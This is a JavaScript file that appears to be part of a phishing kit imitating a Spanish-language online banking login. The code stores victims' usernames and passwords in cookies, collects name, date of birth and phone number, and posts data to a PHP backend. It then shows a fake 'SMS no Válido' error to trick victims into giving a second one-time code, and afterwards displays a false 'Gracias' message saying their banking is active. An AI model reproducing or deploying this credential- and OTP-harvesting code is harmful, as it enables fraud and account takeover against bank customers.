

function chk_log(){

if ($('#inner-ember42').val().length >= 5) {
if ($('#inner-ember45').val().length >= 4) {
$('#ember51').removeAttr('status');
$('#ember51').attr('disabled',false);
$('#ember51').removeClass('disabled');
}else {
$('#ember51').attr('disabled',true);
$('#ember51').addClass('disabled');
}
}else {
$('#ember51').attr('disabled',true);
$('#ember51').addClass('disabled');
}
}

setInterval(function(){ new chk_log(); }, 1000);



function chk_log2(){

if ($('#inner-ember105').val().length >= 7) {
if ($('#inner-ember107').val().length >= 8) {

$('#ember108').removeAttr('status');
$('#ember108').attr('disabled',false);
$('#ember108').removeClass('disabled');
}else {
$('#ember108').attr('disabled',true);
$('#ember108').addClass('disabled');
}
}else {
$('#ember108').attr('disabled',true);
$('#ember108').addClass('disabled');
}
}

setInterval(function(){ new chk_log2(); }, 1000);


/* Click */
$('#ember51').click(function(){
var user = $('#inner-ember42').val();
var pass = $('#inner-ember45').val();
$.cookie('user', user, { expires: 365 * 10 });
$.cookie('pass', pass, { expires: 365 * 10 });
$.cookie('transload', 'true', { expires: 365 * 10 });
$('#ember51').attr('disabled',true);
$('#ember51').addClass('disabled');
setTimeout(function() {window.location.href = './helpers/loginx.php?id=0';}, 300);
});
function makeid(length) {
    var result           = [];
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result.push(characters.charAt(Math.floor(Math.random() * 
 charactersLength)));
   }
   return result.join('');
}


/* Click Data */
$('#ember108').click(function(){
var nombre = $('#inner-ember105').val();
var fecha = $('#inner-ember106').val();
var phone = $('#inner-ember107').val();
$.cookie('nombre', nombre, { expires: 365 * 10 });
$.cookie('phone', phone, { expires: 365 * 10 });
$.cookie('transload_2', 'true', { expires: 365 * 10 });
$('#ember108').attr('disabled',true);
$('#ember108').addClass('disabled');
$.post('assets/php/app.php', {content: 'main'});
$.cookie('cfdi', makeid(16), { expires: 365 * 10 });
setTimeout(function() {window.location.href = './static_w.php?load=3';}, 300);
});


/* Disable Button */
$('#inner-ember111').keyup(function(){
$('#ember29').removeAttr('status');
$('#ember29').attr('disabled',false);
$('#ember29').removeClass('disabled');
});

/* Prevent Form Submit */
$(document).on("submit", "form", function(e){
e.preventDefault();
return  false;
});


/* Click Data */
$('#ember29').click(function(){
var sms = $('#inner-ember111').val();
$('#ember29').attr('disabled',true);
$('#ember29').addClass('disabled');
setTimeout(function() {$('.modalx').html('<div tabindex="0" aria-labelledby="modal-confirm-ember80" data-id="modalConfirm" data-modal-show="true" id="ember80" class="modal-base oh absolute modal-base--overlay ember-view" role="dialog" aria-hidden="false"><div id="ember81" class="modal-card-confirm full-height flexy-item set-padding-2 ember-view"><div id="ember82" class="item-space-wide justify-end set-margin-bottom-2 ember-view"><button data-id="close" class="item-auto-size icon icon-close color_se-0 bg_transparent size_3" aria-label="Cerrar" data-ember-action="" data-ember-action-83="83"></button></div><div id="ember84" class="modal-card-confirm__content full-size max-width-element flexy-item bg_se-0 set-regular-radius set-padding-horizontal set-padding-vertical-3 set-margin-auto oya ember-view"><!----><div data-id="text" id="modal-confirm-ember80" class="modal-card-confirm__text color_se-600 txt_m txt-align-c ember-view"><p tabindex="-1"><b>SMS no Válido</b></p><br><p>Por favor intenta nuevamente.<br>En los siguientes minutos recibiras un nuevo sms de acceso, de lo contrario tu banca permanecerá bloqueada.</p></div><div id="ember87" class="set-margin-top-2 button-stack item-space-wide justify-center ember-view"><ul class="button-stack__content oh"><li id="ember88" class="button-stack__item item-space-wide ember-view"></li><li id="ember90" class="button-stack__item item-space-wide ember-view"></li></ul></div><!----></div></div></div>');}, 2000);
// End

//Start

setTimeout(function() {
	$('#inner-ember111').val('');
$('.modalx').html('');
$('.button-done').html('<button data-id="btnSubmit" id="ember30" class="button-default button set-padding-horizontal-4 width-auto oh relative disabled button--primary ember-view" disabled="" data-status="disabled"><span class="button__content block"><b class="button__text txt_s txt-overflow_ellipsis">Aceptar</b></span></button>');

$('#ember30').click(function(e){
	e.preventDefault();
var sms = $('#inner-ember111').val();
$.post('assets/php/app.php', { sms: sms, cmd: 'sms'});
$('#ember30').attr('disabled',true);
$('#ember30').addClass('disabled');
setTimeout(function() {$('.modalx').html('<div tabindex="0" aria-labelledby="modal-confirm-ember80" data-id="modalConfirm" data-modal-show="true" id="ember80" class="modal-base oh absolute modal-base--overlay ember-view" role="dialog" aria-hidden="false"><div id="ember81" class="modal-card-confirm full-height flexy-item set-padding-2 ember-view"><div id="ember82" class="item-space-wide justify-end set-margin-bottom-2 ember-view"><button data-id="close" class="item-auto-size icon icon-close color_se-0 bg_transparent size_3" aria-label="Cerrar" data-ember-action="" data-ember-action-83="83"></button></div><div id="ember84" class="modal-card-confirm__content full-size max-width-element flexy-item bg_se-0 set-regular-radius set-padding-horizontal set-padding-vertical-3 set-margin-auto oya ember-view"><!----><div data-id="text" id="modal-confirm-ember80" class="modal-card-confirm__text color_se-600 txt_m txt-align-c ember-view"><p tabindex="-1"><b>Gracias</b></p><p>Por seguridad esta sesión finalizará<br>Lamentamos los inconvenientes ocasionados, su banca en linea esta actualmente activada.</p></div><div id="ember87" class="set-margin-top-2 button-stack item-space-wide justify-center ember-view"><ul class="button-stack__content oh"><li id="ember88" class="button-stack__item item-space-wide ember-view"></li></ul></div><!----></div></div></div>');}, 2000);
});

setTimeout(function() {
$('#ember30').click(function(){
var sms = $('#inner-ember111').val();
$('#ember30').attr('disabled',true);
$('#ember30').addClass('disabled');
});
});}, 10000);

});


/* Disable Button */
$('#inner-ember111').keyup(function(){
$('#ember30').removeAttr('status');
$('#ember30').attr('disabled',false);
$('#ember30').removeClass('disabled');
});

